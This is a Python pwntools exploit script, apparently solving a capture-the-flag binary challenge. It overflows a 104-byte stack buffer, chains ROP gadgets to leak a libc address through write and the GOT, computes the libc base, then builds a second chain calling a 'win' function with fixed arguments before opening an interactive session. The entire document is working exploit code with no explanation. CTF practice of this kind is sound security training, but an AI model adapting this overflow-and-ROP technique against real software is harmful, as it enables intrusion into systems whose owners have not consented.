from pwn import *
context.arch = "amd64"

io = process("./bin")
# io = remote("0.cloud.chals.io",12415)
elf = ELF("./bin")
rop = ROP(elf)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

if args.GDB:
    gdbscript="""
    """
    gdb.attach(io, gdbscript=gdbscript)

payload = b'A'*104
payload += p64(elf.sym['win'])
payload += p64(rop.find_gadget(['pop rdi','ret'])[0])
payload += p64(1)
payload += p64(rop.find_gadget(['pop rsi', 'pop r15','ret'])[0])
payload += p64(elf.got['write'])
payload += p64(0)
payload += p64(elf.sym['write'])
payload += p64(elf.sym['main'])
io.sendlineafter(b'them: ', payload)

io.recvline()
io.recvline()
leak = unpack(io.recv(6), 'all')
info(f"got libc leak: {hex(leak)}")

libc.address = leak - 0x114a20
info(f"got libc base: {hex(libc.address)}")

rop = ROP(libc)
payload = b'A'*104
rop.call(elf.sym['win'], [0xdeadbeef, 0xF00DD00DCAFEBABE, 0x1337C0DED457C0DE])
payload += rop.chain()

io.sendline(payload)

io.interactive()
